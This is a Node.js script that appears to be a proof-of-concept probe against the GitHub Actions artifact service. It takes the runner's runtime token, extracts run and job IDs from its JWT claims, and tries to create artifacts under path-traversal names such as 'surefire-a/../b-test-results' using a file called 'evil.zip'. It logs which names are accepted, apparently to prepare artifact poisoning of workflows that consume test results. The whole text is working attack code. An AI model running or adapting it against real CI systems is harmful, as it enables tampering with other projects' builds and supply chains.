import fs from 'node:fs';
import crypto from 'node:crypto';
const tok = process.env.ACTIONS_RUNTIME_TOKEN;
const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
const claims = JSON.parse(Buffer.from(tok.split('.')[1], 'base64url').toString());
let rid, jid;
for (const sc of claims.scp.split(' ')) { const p = sc.split(':'); if (p[0] === 'Actions.Results' && p.length === 3) { rid = p[1]; jid = p[2]; } }
const zip = fs.readFileSync('evil.zip');
const names = [
  'surefire-a/b-test-results',
  'surefire-..-test-results',
  'surefire-a/../b-test-results',
  'surefire-a\\..\\..\\b-test-results',
  'surefire-...test-results',
  'surefire- a test-results',
];
for (const name of names) {
  const r = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', {
    method: 'POST', headers: {authorization: 'Bearer ' + tok, 'content-type': 'application/json'},
    body: JSON.stringify({workflow_run_backend_id: rid, workflow_job_run_backend_id: jid, name, version: 7, mime_type: 'application/zip'})
  });
  const j = await r.json();
  console.log(JSON.stringify(name), '->', r.status, (j.msg || (j.ok ? 'OK' : JSON.stringify(j))).slice(0, 60));
}
